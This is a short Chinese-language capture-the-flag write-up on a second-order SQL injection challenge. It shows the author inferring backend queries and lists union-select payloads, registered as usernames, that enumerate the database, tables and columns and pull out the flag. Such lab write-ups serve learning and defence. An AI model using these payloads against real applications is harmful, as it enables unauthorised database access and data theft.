# October 2019 Twice SQL Injection

## October 2019 Twice SQL Injection

## 考点

* 注册登录处的二次注入

## wp

看到链接是http://91074d2e-c159-41d3-94a5-47dc939e21bf.node4.buuoj.cn:81/?action=login

尝试`?action=php://filter/read=convert.base64-encode/resource=login`没有反应，那就走流程

有注册、登录和修改信息的功能，先注册用户试试，注册一个aaaaaa，登录可以看到info是有信息的，说明在登录查询之后还有个查询

```sql
select pass from users where name = 'aaa'
select info from users where name = 'aaa'
```

注册一个aaaaaa'，登录发现info变成空白，再注册aaa"，登录发现info又有信息了，可以猜一下后端的插入语句

```sql
insert into users (id,name,pass,info)
values (1,'aaa','aaa','something')
```

在修改info的时候，先改成123，看到返回123，更新完之后还有个查询

```sql
UPDATE users SET info = '123' WHERE name = 'aaa'
select info from users where name = 'aaa'
```

修改info尝试二次注入无果，再去注册登录处测试`bbb' union select database()#`&#x20;

```
insert into users (id,name,pass,info) values (1,'bbb\' union select database()#','aaa','something')
```

在info那个查询处&#x20;

```
select info from users where name = 'bbb' union select database()#'
```

注册

```
bbb' union select database()#
bbb' union select group_concat(table_name) from information_schema.tables where table_schema='ctftraining' #
bbb' union select group_concat(column_name) from information_schema.columns where table_name='flag'#
bbb' union select flag from flag #
```

## 总结

1. 如果感觉有多个二次注入的点，都试试
